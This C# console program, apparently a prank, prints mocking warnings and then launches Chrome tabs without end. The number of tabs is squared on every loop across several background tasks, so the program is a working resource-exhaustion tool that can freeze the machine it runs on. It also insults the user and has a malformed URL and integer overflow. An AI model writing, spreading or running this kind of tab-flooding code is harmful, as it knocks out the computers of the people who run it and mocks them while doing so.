using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace ChaoticChromeLauncher
{
    class Program
    {
        static Random rng = new Random();
        static object locker = new object();

        static void Main(string[] args)
        {
            Console.Title = "ABSOLUTE CHAOS EXECUTOR v0.0000001";
            PrintIntro();

            int initialTabs = rng.Next(1, 2); 
            ExponentialTabHell(initialTabs);
        }

        static void PrintIntro()
        {
            string[] warnings = {
                "WARNING: This program may immolate your RAM.",
                "WARNING: Your CPU will cry.",
                "WARNING: Why are you running this?",
                "WARNING: You are an idiot."
            };

            foreach (string w in warnings.OrderBy(x => rng.Next()))
            {
                Console.WriteLine(w);
                Thread.Sleep(rng.Next(100, 400));
            }

            Console.WriteLine("\nStarting in 3...");
            Thread.Sleep(400);
            Console.WriteLine("2...");
            Thread.Sleep(400);
            Console.WriteLine("1...");
            Thread.Sleep(400);
            Console.WriteLine("You're screwed.\n");
        }

        static void ExponentialTabHell(int start)
        {
            int tabs = start;
            List<Task> backgroundTasks = new List<Task>();

            while (true)
            {
                int chaosFactor = rng.Next(1, 5); 
                List<int> meaninglessList = Enumerable.Range(0, chaosFactor).ToList();

                foreach (var pointlessValue in meaninglessList)
                {
                    backgroundTasks.Add(Task.Run(() =>
                    {
                        lock (locker)
                        {
                            for (int i = 0; i < tabs; i++)
                            {
                                try
                                {
                                    Process.Start("chrome.exe", GenerateRandomURL());
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine($"Error: {ex.Message}");
                                }
                            }
                        }
                    }));
                }

                Console.WriteLine($"Spawned {tabs} tabs * {meaninglessList.Count} chaos threads = {tabs * meaninglessList.Count} total tabs. RIP.");

                tabs = (int)Math.Pow(tabs + 1, 2); 

                Thread.Sleep(rng.Next(500, 1500)); 
            }
        }

        static string GenerateRandomURL()
        {
            string[] urls = {
                "https://google.com",
                "https://bing.com (eew)",
                "https://example.com",
                "https://youtube.com",
                "https://stackoverflow.com/questions/ask",
                "https://amionidiot.com" 
            };

            return urls[rng.Next(urls.Length)];
        }
    }
}
